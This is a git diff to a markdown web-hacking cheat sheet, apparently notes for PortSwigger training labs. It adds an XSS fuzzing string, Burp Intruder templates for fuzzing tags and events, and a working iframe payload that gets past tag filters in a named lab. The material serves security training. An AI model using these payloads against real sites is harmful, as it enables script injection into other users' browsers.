@@ -7,7 +7,7 @@ For those who can't afford burp pro or cheapskates thogh you can't take an actua
 [XSS](#XSS)  
 [Cache Poisoning](#Cache-poisoning)  
 [HTTP Host Header Attacks](#HTTP-Host-header-attacks)  
-[HTTP Request Smuggling](#Http-request-smuggling)
+[HTTP Request Smuggling](#Http-request-smuggling)  
 [Authentication Bypass](#Authentication-Bypass)  
 [Bruteforcing](#Brute-forcing)
 
@@ -166,9 +166,29 @@ git show COMMIT_ID:FILENAME
 
 #### XSS
 
-fuzz payload:
+Fuzzer:
 ```js
 <>\'\"<script>{{7*7}}$(alert(1)}"-prompt(55)-"fuzzer
+```
+
+##### Bypassing restrictions on tags and attributes
+
+Use [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) with Intruder.
+
+Fuzz tags:
+```html
+GET /?search=<§§> HTTP/2
+```
+Fuzz events:
+```html
+GET /?search=<body%20§§=print()> HTTP/2
+```
+
+[Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)
+
+Working payload for this lab:
+```html
+<iframe src="https://0a94001004ef162c802adf6300cd000b.web-security-academy.net/?search=%3Cbody%20onresize%3Dprint()%3E" onload=this.style.width='500px'>
 ```
 
 ##### Reflected DOM
